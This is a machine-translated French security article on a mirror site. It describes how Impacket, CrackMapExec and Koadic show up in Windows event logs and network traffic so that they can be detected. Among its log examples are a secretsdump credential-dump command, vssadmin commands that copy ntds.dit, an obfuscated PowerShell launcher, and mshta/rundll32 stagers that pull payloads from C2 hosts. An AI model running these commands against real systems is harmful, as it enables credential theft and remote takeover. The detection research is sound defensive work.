<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üç≥ üóÉÔ∏è üöô Comment d√©tecter les attaques sur l'infrastructure Windows: explorer les outils de piratage üë®üèº‚Äçüî¨ üë≥ üåù</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Le nombre d'attaques dans le secteur des entreprises augmente chaque ann√©e: par exemple, en 2017, 13% d'incidents uniques de plus ont √©t√© enregistr√©s ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Comment d√©tecter les attaques sur l'infrastructure Windows: explorer les outils de piratage</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/460517/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><img src="https://habrastorage.org/webt/qm/kv/ra/qmkvra9qmrta93tfbev2d6pdm7k.png"></a> <br><br>  Le nombre d'attaques dans le secteur des entreprises augmente chaque ann√©e: par exemple, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">en 2017, 13% d'incidents uniques de plus ont √©t√© enregistr√©s</a> qu'en 2016, et √† la fin de 2018, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">27% d'incidents de plus</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">avaient √©t√© enregistr√©s</a> par rapport √† la p√©riode pr√©c√©dente.  Y compris ceux o√π l'outil de travail principal est le syst√®me d'exploitation Windows.  En 2017-2018, les <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">groupes</a> APT Dragonfly, APT28, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">APT MuddyWater ont</a> attaqu√© des organisations gouvernementales et militaires en Europe, en Am√©rique du Nord et en Arabie saoudite.  Et ils ont utilis√© trois outils pour cela - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Impacket</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">CrackMapExec</a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Koadic</a> .  Leur code source est ouvert et disponible sur GitHub. <br><br>  Il convient de noter que ces outils ne sont pas utilis√©s pour la p√©n√©tration initiale, mais pour le d√©veloppement d'une attaque au sein de l'infrastructure.  Les attaquants les utilisent √† diff√©rents stades de l'attaque, apr√®s avoir surmont√© le p√©rim√®tre.  Ceci, soit dit en passant, est difficile √† d√©tecter et souvent uniquement √† l'aide de technologies pour <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">identifier les traces de compromission dans le trafic r√©seau</a> ou d'outils qui peuvent <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">d√©tecter les actions actives d'un attaquant apr√®s qu'il a p√©n√©tr√© dans l'infrastructure</a> .  Les outils offrent de nombreuses fonctions - du transfert de fichiers √† l'interaction avec le registre et l'ex√©cution de commandes sur une machine distante.  Nous avons men√© une √©tude de ces outils pour d√©terminer leur activit√© r√©seau. <a name="habracut"></a><br><br>  Ce que nous devions faire: <br><br><ul><li>  <b>Comprenez comment fonctionnent les outils de piratage</b> .  D√©couvrez ce dont les attaquants ont besoin pour fonctionner et quelles technologies ils peuvent utiliser. </li><li>  <b>Trouvez ce qui n'est pas d√©tect√© par les outils de s√©curit√© des informations dans les premi√®res √©tapes d'une attaque</b> .  La phase de renseignement peut √™tre ignor√©e, soit parce que l'attaquant est un attaquant interne, soit parce que l'attaquant exploite une lacune de l'infrastructure qui n'√©tait pas connue auparavant.  Il y a une opportunit√© de restaurer toute la cha√Æne de ses actions, d'o√π le d√©sir de d√©tecter de nouveaux mouvements. </li><li>  <b>√âliminez les fausses alarmes des outils de d√©tection d'intrusion</b> .  Nous ne devons pas oublier que lors de la d√©tection de certaines actions sur la seule base de l'intelligence, des erreurs fr√©quentes sont possibles.  Habituellement, dans l'infrastructure, il existe un nombre suffisant de moyens, indiscernables du l√©gitime √† premi√®re vue, pour obtenir des informations. </li></ul><br>  Que donnent ces outils aux attaquants?  S'il s'agit d'Impacket, les attaquants obtiennent une grande biblioth√®que de modules qui peuvent √™tre utilis√©s √† diff√©rents stades de l'attaque apr√®s la p√©n√©tration.  De nombreux outils utilisent des modules Impacket en eux-m√™mes - par exemple, Metasploit.  Il a dcomexec et wmiexec pour l'ex√©cution de commandes √† distance, secretsdump pour r√©cup√©rer les comptes de la m√©moire qui sont ajout√©s √† partir d'Impacket.  En cons√©quence, la d√©tection correcte de l'activit√© d'une telle biblioth√®que sera √©galement assur√©e par la d√©tection de d√©riv√©s. <br><br>  √Ä propos de CrackMapExec (ou simplement CME), les cr√©ateurs ont par hasard √©crit "Powered by Impacket".  En outre, CME a des fonctionnalit√©s pr√™tes √† l'emploi pour les sc√©narios populaires: il s'agit de Mimikatz pour recevoir les mots de passe ou leurs hachages, et la mise en ≈ìuvre de Meterpreter ou de l'agent Empire pour une ex√©cution √† distance, et Bloodhound √† bord. <br><br>  Le troisi√®me outil que nous avons s√©lectionn√© est Koadic.  Il est assez r√©cent, a √©t√© pr√©sent√© √† la conf√©rence internationale des pirates informatiques DEFCON 25 en 2017 et a une approche non standard: travailler via HTTP, Java Script et Microsoft Visual Basic Script (VBS).  Cette approche s'appelle vivre hors de la terre: l'outil utilise un ensemble de d√©pendances et de biblioth√®ques int√©gr√©es √† Windows.  Les cr√©ateurs l'appellent COM Command Control ou C3. <br><br><h2>  IMPACKET </h2><br>  La fonctionnalit√© d'Impacket est tr√®s large, √† partir de la reconnaissance dans AD et de la collecte de donn√©es √† partir de serveurs MS SQL internes, se terminant par des techniques pour obtenir des informations d'identification: il s'agit d'une attaque de relais SMB et de la r√©ception d'un fichier ntds.dit contenant les hachages de mot de passe utilisateur √† partir d'un contr√¥leur de domaine.  Impacket ex√©cute √©galement √† distance des commandes √† l'aide de quatre m√©thodes diff√©rentes: via WMI, un service de gestion du planificateur Windows, DCOM et SMB, et pour cela, il a besoin d'informations d'identification. <br><br><h3>  Secretsdump </h3><br>  Regardons secretsdump.  Il s'agit d'un module dont le but peut √™tre √† la fois des machines utilisateur et des contr√¥leurs de domaine.  En l'utilisant, vous pouvez obtenir des copies des zones de m√©moire LSA, SAM, SECURITY, NTDS.dit, afin qu'elles puissent √™tre vues √† diff√©rents stades de l'attaque.  La premi√®re √©tape du fonctionnement du module est l'authentification via SMB, qui n√©cessite soit un mot de passe utilisateur, soit son hachage pour mener automatiquement l'attaque Pass the Hash.  Ensuite, une demande pour ouvrir l'acc√®s √† Service Control Manager (SCM) et acc√©der au registre √† l'aide du protocole winreg, √† l'aide de laquelle un attaquant peut trouver les donn√©es des branches qui l'int√©ressent et obtenir des r√©sultats via SMB. <br><br>  Dans la fig.  1 nous voyons comment exactement lors de l'utilisation du protocole winreg l'acc√®s est obtenu par la cl√© de registre avec LSA.  Pour ce faire, utilisez la commande DCERPC avec l'opcode 15 - OpenKey. <br><br><img src="https://habrastorage.org/webt/28/g3/uf/28g3ufutlahahdolf8mne9sa4q4.png"><br>  <i>Fig.</i>  <i>1. Ouverture de la cl√© de registre √† l'aide du protocole winreg</i> <br><br>  De plus, lorsque l'acc√®s √† la cl√© est obtenu, les valeurs sont enregistr√©es √† l'aide de la commande SaveKey avec l'opcode 20. Impacket rend cela tr√®s sp√©cifique.  Il enregistre les valeurs dans un fichier dont le nom est une cha√Æne de 8 caract√®res al√©atoires avec l'ajout de .tmp.  En outre, un d√©chargement suppl√©mentaire de ce fichier se produit via SMB √† partir du r√©pertoire System32 (Fig. 2). <br><br><img src="https://habrastorage.org/webt/v8/o-/56/v8o-56ycynu817pivdpr65jvtk8.png"><br>  <i>Fig.</i>  <i>2. Sch√©ma d'obtention d'une cl√© de registre √† partir d'une machine distante</i> <br><br>  Il s'av√®re que vous pouvez d√©tecter une telle activit√© sur le r√©seau en interrogeant certaines branches de registre en utilisant le protocole winreg, des noms sp√©cifiques, des commandes et leur ordre. <br><br>  Ce module laisse √©galement des traces dans le journal des √©v√©nements Windows, gr√¢ce auquel il est facilement d√©tect√©.  Par exemple, √† la suite d'une commande <br><br><pre><code class="bash hljs">secretsdump.py -debug -system SYSTEM -sam SAM -ntds NTDS -security SECURITY -bootkey BOOTKEY -outputfile 1.txt -use-vss -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span>-method mmcexec -user-status -dc-ip 192.168.202.100 -target-ip 192.168.202.100 contoso/Administrator:@DC</code> </pre> <br>  dans le journal de Windows Server 2016, nous verrons la s√©quence d'√©v√©nements cl√© suivante: <br><br>  1. 4624 - Ouverture de session √† distance. <br>  2. 5145 - v√©rification des droits d'acc√®s au service winreg distant. <br>  3. 5145 - v√©rification des autorisations de fichier dans le r√©pertoire System32.  Le fichier a le nom al√©atoire mentionn√© ci-dessus. <br>  4. 4688 - cr√©ation du processus cmd.exe qui lance vssadmin: <br><br><pre> <code class="bash hljs">‚ÄúC:\windows\system32\cmd.exe<span class="hljs-string"><span class="hljs-string">" /Q /c echo c:\windows\system32\cmd.exe /C vssadmin list shadows ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</span></span></code> </pre> <br>  5. 4688 - cr√©ation d'un processus avec la commande: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin create shadow /For=C: ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  6. 4688 - cr√©ation d'un processus avec la commande: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit %SYSTEMROOT%\Temp\rmumAfcn.tmp ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  7. 4688 - cr√©ation d'un processus avec la commande: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin delete shadows /For=C: /Quiet ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br><h3>  Smbexec </h3><br>  Comme de nombreux outils de post-exploitation, Impacket poss√®de des modules pour l'ex√©cution de commandes √† distance.  Nous nous concentrerons sur smbexec, qui fournit un shell interactif sur une machine distante.  Ce module n√©cessite √©galement une authentification SMB avec un mot de passe ou son hachage.  Dans la fig.  3 nous voyons un exemple de la fa√ßon dont un tel outil fonctionne, dans ce cas, il s'agit d'une console d'administration locale. <br><br><img src="https://habrastorage.org/webt/65/dx/os/65dxos1pwb3v9sy457qqqcasjzi.png"><br>  <i>Fig.</i>  <i>3. Console interactive Smbexec</i> <br><br>  La premi√®re √©tape de smbexec apr√®s l'authentification est d'ouvrir le SCM avec la commande OpenSCManagerW (15).  La demande est √† noter: le champ MachineName y est d√©fini sur DUMMY. <br><br><img src="https://habrastorage.org/webt/rr/ob/go/rrobgonzydm5evu36sxa3awiw0k.png"><br>  <i>Fig.</i>  <i>4. Demande d'ouverture de Service Control Manager</i> <br><br>  Ensuite, un service est cr√©√© √† l'aide de la commande CreateServiceW (12).  Dans le cas de smbexec, on retrouve √† chaque fois la m√™me logique de team building.  Dans la fig.  5 vert indique les param√®tres invariables de la commande, jaune - ce que l'attaquant peut changer.  Il est facile de remarquer que le nom du fichier ex√©cutable, son r√©pertoire et le fichier de sortie peuvent √™tre modifi√©s, mais le reste peut √™tre chang√© beaucoup plus difficile sans violer la logique du module Impacket. <br><br><img src="https://habrastorage.org/webt/in/na/fo/innafo8sq7hwikto5cli9sv9-ow.png"><br>  <i>Fig.</i>  <i>5. Demande de cr√©ation d'un service √† l'aide de Service Control Manager</i> <br><br>  Smbexec laisse √©galement des traces claires dans le journal des √©v√©nements Windows.  Dans le journal Windows Server 2016 pour le shell interactif avec la commande ipconfig, nous verrons la s√©quence de touches suivante des √©v√©nements: <br><br>  1. 4697 - installation du service sur la machine de la victime: <br><br><pre> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  2. 4688 - cr√©ation du processus cmd.exe avec les arguments du paragraphe 1. <br>  3. 5145 - v√©rification des autorisations sur le fichier __output dans le r√©pertoire C $. <br>  4. 4697 - installation du service sur la machine de la victime. <br><br><pre> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> ipconfig ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  5. 4688 - cr√©ation du processus cmd.exe avec les arguments du paragraphe 4. <br>  6. 5145 - v√©rification des droits d'acc√®s au fichier __output dans le r√©pertoire C $. <br><br>  Impacket est le fondement du d√©veloppement d'outils d'attaque.  Il prend en charge presque tous les protocoles de l'infrastructure Windows et a en m√™me temps ses propres caract√©ristiques.  Voici les demandes winreg sp√©cifiques et l'utilisation de l'API SCM avec la formation caract√©ristique des commandes, le format de nom de fichier et le partage SMB SYSTEM32. <br><br><h2>  CRACKMAPEXEC </h2><br>  L'outil CME est principalement con√ßu pour automatiser les actions de routine qu'un attaquant doit effectuer pour avancer au sein du r√©seau.  Il vous permet de travailler en collaboration avec le c√©l√®bre agent Empire et Meterpreter.  Pour ex√©cuter des commandes secr√®tement, le CME peut les masquer.  √Ä l'aide de Bloodhound (un outil d'intelligence distinct), un attaquant peut automatiser la recherche d'une session d'administrateur de domaine actif. <br><br><h3>  Bloodhound </h3><br>  Bloodhound en tant qu'outil ind√©pendant permet une intelligence avanc√©e au sein du r√©seau.  Il collecte des donn√©es sur les utilisateurs, les machines, les groupes, les sessions et se pr√©sente sous la forme d'un script sur PowerShell ou d'un fichier binaire.  Les protocoles LDAP ou SMB sont utilis√©s pour collecter des informations.  Le module d'int√©gration CME vous permet de t√©l√©charger Bloodhound sur la machine de la victime, d'ex√©cuter et de recevoir les donn√©es collect√©es apr√®s l'ex√©cution, automatisant ainsi les actions dans le syst√®me et les rendant moins visibles.  Le shell graphique Bloodhound pr√©sente les donn√©es collect√©es sous forme de graphiques, ce qui vous permet de trouver le chemin le plus court de la machine attaquante √† l'administrateur de domaine. <br><br><img src="https://habrastorage.org/webt/5g/b6/xm/5gb6xmpsvew_hmxv_j_e6z89nec.png"><br>  <i>Fig.</i>  <i>6. Interface Bloodhound</i> <br><br>  Pour s'ex√©cuter sur la machine de la victime, le module cr√©e une t√¢che en utilisant ATSVC et SMB.  ATSVC est une interface pour travailler avec le Planificateur de t√¢ches Windows.  CME utilise sa fonction NetrJobAdd (1) pour cr√©er des t√¢ches sur le r√©seau.  Un exemple de ce que le module CME envoie est illustr√© √† la fig.  7: Ceci est un appel √† cmd.exe et le code obscurci comme arguments au format XML. <br><br><img src="https://habrastorage.org/webt/h1/ft/_t/h1ft_tmh38cii_onpk6k4dydd10.png"><br>  <i>Fig.7.</i>  <i>Cr√©ation d'une t√¢che via CME</i> <br><br>  Une fois la t√¢che termin√©e, la machine de la victime lance Bloodhound elle-m√™me, et cela se voit dans la circulation.  Le module est caract√©ris√© par des requ√™tes LDAP pour la r√©ception de groupes standard, une liste de toutes les machines et des utilisateurs du domaine, la r√©ception d'informations sur les sessions utilisateur actives via la requ√™te SRVSVC NetSessEnum. <br><br><img src="https://habrastorage.org/webt/pm/i3/5a/pmi35abw7jc1vjo-zrexijzhqks.png"><br>  <i>Fig.</i>  <i>8. Obtenir une liste des sessions actives via SMB</i> <br><br>  De plus, le lancement de Bloodhound sur la machine de la victime avec l'audit activ√© est accompagn√© d'un √©v√©nement avec l'ID 4688 (cr√©ation de processus) et le nom de processus <code>¬´C:\Windows\System32\cmd.exe¬ª</code> .  Il convient de noter les arguments de la ligne de commande: <br><br><pre> <code class="bash hljs">cmd.exe /Q /c powershell.exe -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> bypass -noni -nop -w 1 -C <span class="hljs-string"><span class="hljs-string">" &amp; ( </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$eNV</span></span></span><span class="hljs-string">:cOmSPEc[4,26,25]-JOiN'')( [chAR[]](91 , 78, 101,116 , 46, 83 , 101 , ‚Ä¶ , 40,41 )-jOIN'' ) "</span></span></code> </pre> <br><h3>  Enum_avproducts </h3><br>  Du point de vue de la fonctionnalit√© et de l'impl√©mentation, le module enum_avproducts est tr√®s int√©ressant.  WMI permet d'utiliser le langage de requ√™te WQL pour recevoir des donn√©es de divers objets Windows, ce qui est essentiellement ce que ce module CME utilise.  Il g√©n√®re des demandes aux classes AntiSpywareProduct et AntiMirusProduct concernant les protections install√©es sur la machine de la victime.  Afin d'obtenir les donn√©es n√©cessaires, le module se connecte √† l'espace de noms root \ SecurityCenter2, puis g√©n√®re une requ√™te WQL et re√ßoit une r√©ponse.  Dans la fig.  La figure 9 montre le contenu de ces demandes et r√©ponses.  Dans notre exemple, Windows Defender a √©t√© trouv√©. <br><br><img src="https://habrastorage.org/webt/qs/lx/i5/qslxi5tarfkx3quxppml3vcgudm.png"><br>  <i>Fig.</i>  <i>9. Activit√© r√©seau du module enum_avproducts</i> <br><br>  Souvent, l'audit WMI (Trace WMI-Activity), dans les √©v√©nements dont vous pouvez trouver des informations utiles sur les requ√™tes WQL, peut √™tre d√©sactiv√©.  Mais s'il est activ√©, si le script enum_avproducts est ex√©cut√©, l'√©v√©nement avec l'ID 11 sera enregistr√©. Il contiendra le nom de l'utilisateur qui a envoy√© la demande et le nom dans l'espace de noms root \ SecurityCenter2. <br><br>  Chacun des modules CME a r√©v√©l√© ses propres artefacts, qu'il s'agisse de requ√™tes WQL sp√©cifiques ou de la cr√©ation d'un certain type de t√¢che dans le planificateur de t√¢ches avec obscurcissement et de l'activit√© typique de Bloodhound dans LDAP et SMB. <br><br><h2>  Koadic </h2><br>  Une caract√©ristique distinctive de Koadic est l'utilisation d'interpr√©teurs Windows int√©gr√©s JavaScript et VBScript.  En ce sens, il suit la tendance de vivre hors de la terre - c'est-√†-dire qu'il n'a pas de d√©pendances externes et utilise des outils Windows standard.  Il s'agit d'un outil de commande et de contr√¥le complet (CnC), car apr√®s l'infection, un ¬´implant¬ª est install√© sur la machine, ce qui permet de la contr√¥ler.  Une telle machine, dans la terminologie koadique, est appel√©e ¬´zombie¬ª.  Avec un manque de privil√®ges pour un travail √† part enti√®re du c√¥t√© de la victime, Koadic a la capacit√© de les √©lever en utilisant la technique de contournement UAC. <br><br><img src="https://habrastorage.org/webt/z7/lp/e9/z7lpe96_xft7qv9xvusq-4uzukm.png"><br>  <i>Fig.</i>  <i>10. Command Shell Koadic</i> <br><br>  La victime doit initier la communication avec le serveur Command &amp; Control lui-m√™me.  Pour ce faire, elle doit demander un URI pr√©-pr√©par√© et obtenir le corps Koadic principal en utilisant l'un des stagers.  Dans la fig.  11 montre un exemple pour le stager mshta. <br><br><img src="https://habrastorage.org/webt/rg/sk/fu/rgskfuogt-22hdhlrn8553hi88k.png"><br>  <i>Fig.</i>  <i>11. Initialisation d'une session avec un serveur CnC</i> <br><br>  En utilisant la variable de r√©ponse WS, il devient clair que l'ex√©cution se produit via WScript.Shell, et les variables STAGER, SESSIONKEY, JOBKEY, JOBKEYPATH, EXPIRE contiennent des informations cl√©s sur les param√®tres de la session en cours.  Il s'agit de la premi√®re paire requ√™te-r√©ponse dans une connexion HTTP √† un serveur CnC.  Les demandes ult√©rieures sont directement li√©es √† la fonctionnalit√© des modules appel√©s (implants).  Tous les modules Koadic fonctionnent uniquement avec une session active avec CnC. <br><br><h3>  Mimikatz </h3><br>  Tout comme CME fonctionne avec Bloodhound, Koadic travaille avec Mimikatz en tant que programme autonome et a plusieurs fa√ßons de l'ex√©cuter.  Vous trouverez ci-dessous une paire requ√™te-r√©ponse pour le chargement d'un implant Mimikatz. <br><br><img src="https://habrastorage.org/webt/d6/8m/4a/d68m4amrfwoylxnmm_o06auiucu.png"><br>  <i>Fig.</i>  <i>12. Transfert de Mimikatz √† Koadic</i> <br><br>  Vous pouvez remarquer comment le format URI dans la demande a chang√©.  Il est apparu la valeur de la variable csrf, qui est responsable du module s√©lectionn√©.  Ne faites pas attention √† son nom;  nous savons tous que le CSRF est g√©n√©ralement compris diff√©remment.  En r√©ponse, le m√™me corps principal de Koadic est entr√©, dans lequel le code associ√© √† Mimikatz a √©t√© ajout√©.  Il est assez grand, alors consid√©rez les points cl√©s.  Devant nous se trouve la biblioth√®que Mimikatz cod√©e en base64, la classe .NET s√©rialis√©e qui l'injectera et les arguments pour ex√©cuter Mimikatz.  Le r√©sultat de l'ex√©cution est transmis sur le r√©seau en clair. <br><br><img src="https://habrastorage.org/webt/sg/ua/jx/sguajxxqyymj7sbhr3nwjism2pe.png"><br>  <i>Fig.</i>  <i>13. Le r√©sultat de l'ex√©cution de Mimikatz sur une machine distante</i> <br><br><h3>  Exec_cmd </h3><br>  Koadic poss√®de √©galement des modules qui peuvent ex√©cuter des commandes √† distance.  Ici, nous verrons la m√™me m√©thode de g√©n√©ration d'URI et les variables famili√®res sid et csrf.  Dans le cas du module exec_cmd, du code est ajout√© au corps capable d'ex√©cuter des commandes shell.  Le code suivant est affich√© dans la r√©ponse HTTP du serveur CnC. <br><br><img src="https://habrastorage.org/webt/v7/3c/yw/v73cywsdkemyp0lsoemc0sn6ed4.png"><br>  <i>Fig.</i>  <i>14. Le code de l'implant exec_cmd</i> <br><br>  La variable GAWTUUGCFI avec l'attribut WS familier est requise pour l'ex√©cution de code.  Avec son aide, l'implant appelle le shell, traitant deux branches de code - shell.exec avec le retour du flux de donn√©es de sortie et shell.run sans retour. <br><br>  Koadic n'est pas un outil typique, mais il a ses propres artefacts par lesquels il peut √™tre trouv√© dans le trafic l√©gitime: <br><br><ul><li>  formation sp√©ciale des requ√™tes HTTP, </li><li>  en utilisant l'API winHttpRequests, </li><li>  la cr√©ation d'un objet WScript.Shell via ActiveXObject, </li><li>  grand corps ex√©cutable. </li></ul><br>  La connexion initiale lance le stager, il devient donc possible de d√©tecter son activit√© via les √©v√©nements Windows.  Pour mshta, il s'agit de l'√©v√©nement 4688, qui parle de la cr√©ation d'un processus avec un attribut de lancement: <br><br><pre> <code class="bash hljs">C:\Windows\system32\mshta.exe http://192.168.211.1:9999/dXpT6</code> </pre> <br>  Pendant l'ex√©cution de Koadic, vous pouvez voir d'autres √©v√©nements 4688 avec des attributs qui le caract√©risent parfaitement: <br><br><pre> <code class="bash hljs">rundll32.exe http://192.168.241.1:9999/dXpT6?sid=1dbef04007a64fba83edb3f3928c9c6c; csrf=;\..\..\..\mshtml,RunHTMLApplication rundll32.exe http://192.168.202.136:9999/dXpT6?sid=12e0bbf6e9e5405690e5ede8ed651100;csrf=18f93a28e0874f0d8d475d154bed1983;\..\..\..\mshtml,RunHTMLApplication <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; net session 1&gt; C:\Users\user02\AppData\Local\Temp\6dc91b53-ddef-2357-4457-04a3c333db06.txt 2&gt;&amp;1 <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; ipconfig 1&gt; C:\Users\user02\AppData\Local\Temp\721d2d0a-890f-9549-96bd-875a495689b7.txt 2&gt;&amp;1</code> </pre> <br><h2>  Conclusions </h2><br>  La tendance √† vivre hors de la terre gagne en popularit√© parmi les intrus.  Ils utilisent les outils et m√©canismes Windows int√©gr√©s pour leurs besoins.  Nous voyons comment les outils populaires Koadic, CrackMapExec et Impacket qui suivent ce principe se retrouvent de plus en plus dans les rapports APT.  Le nombre de fourches sur GitHub pour ces outils augmente √©galement, de nouvelles apparaissent (il y en a d√©j√† environ un millier).  La tendance gagne en popularit√© en raison de sa simplicit√©: les attaquants n'ont pas besoin d'outils tiers, ils sont d√©j√† sur les machines des victimes et aident √† contourner les outils de protection.  Nous nous concentrons sur l'√©tude de la connectivit√© r√©seau: chaque outil d√©crit ci-dessus laisse sa marque sur le trafic r√©seau;  une √©tude d√©taill√©e d'entre eux nous a permis d'apprendre √† notre produit <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">PT Network Attack Discovery</a> √† les d√©tecter, ce qui permet au final d'enqu√™ter sur toute la cha√Æne des cyberincidents les impliquant. <br><br>  <b>Auteurs</b> : <br><br><ul><li>  Anton Tyurin, responsable des services experts, PT Expert Security Center, Positive Technologies </li><li>  Egor Podmokov, expert, PT Expert Security Center, Positive Technologies </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr460517/">https://habr.com/ru/post/fr460517/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr460505/index.html">Attirer trois croix, ou pourquoi les projets sont si difficiles √† terminer √† temps</a></li>
<li><a href="../fr460509/index.html">Comment les mandataires r√©sidents aident-ils dans les affaires: un cas r√©el d'utilisation d'Infatica dans l'exploration de donn√©es</a></li>
<li><a href="../fr460511/index.html">R√©glage PHP-FPM: utilisation de pm statique pour des performances maximales</a></li>
<li><a href="../fr460513/index.html">Flutter 1.7 - Quoi de neuf dans la version du 10 juillet 2019</a></li>
<li><a href="../fr460515/index.html">Sommes-nous vraiment proches de l'av√®nement des robots?</a></li>
<li><a href="../fr460521/index.html">Les aventures des Malvari insaisissables, Partie IV: DDE et champs de document Word</a></li>
<li><a href="../fr460523/index.html">Annonce d'un mitap qui se transforme en douceur en un drinkcap BeerPHP (√† Moscou et en ligne)</a></li>
<li><a href="../fr460525/index.html">Bienvenue √† DINS IT EVENING en juillet: QA et JS</a></li>
<li><a href="../fr460527/index.html">R√©solution de probl√®mes avec pwnable.kr 06 - al√©atoire et 09 - erreur</a></li>
<li><a href="../fr460531/index.html">Curieuses perversions du monde informatique - 5</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
